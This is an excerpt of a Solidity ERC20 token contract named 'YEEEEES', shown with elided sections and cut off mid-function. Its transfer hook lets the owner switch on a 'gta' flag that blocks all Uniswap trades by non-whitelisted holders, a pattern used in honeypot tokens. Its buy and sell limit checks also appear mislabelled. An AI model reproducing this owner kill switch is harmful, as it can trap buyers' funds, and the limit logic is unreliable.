...
contract YEEEEES is Ownable, ERC20 {
    bool public gta;
    ...
    constructor() ERC20("YEEEEES", "TOKENX") {
        _mint(msg.sender, 102000000 * (10 ** uint256(decimals())));
    }

    function enableTradingAndGTA(bool _tradingEnabled, bool _gta) external onlyOwner {
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount) override internal virtual {
        ...
        if (uniswapV2Pair != address(0)) {
            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                require(tradingEnabled, "CTR: Crash Team Racing: 'Whoa! Slow down, speedster!' PS: Trading is not enabled yet.");
                if (!whitelists[from] && !whitelists[to]) {
                    require(!gta, "GTA: 'You've just been wasted. PS: GTA is activated");
                    if (maxSellEnabled && from == uniswapV2Pair && amount > maxSellAmount) {
                        revert("Tekken 3: 'Your ambition exceeds your abilities...'. PS: Your sell amount is beyond the limit of maxSellAmount.");
                    }
                    if (maxBuyEnabled && to == uniswapV2Pair && amount > maxBuyAmount) {
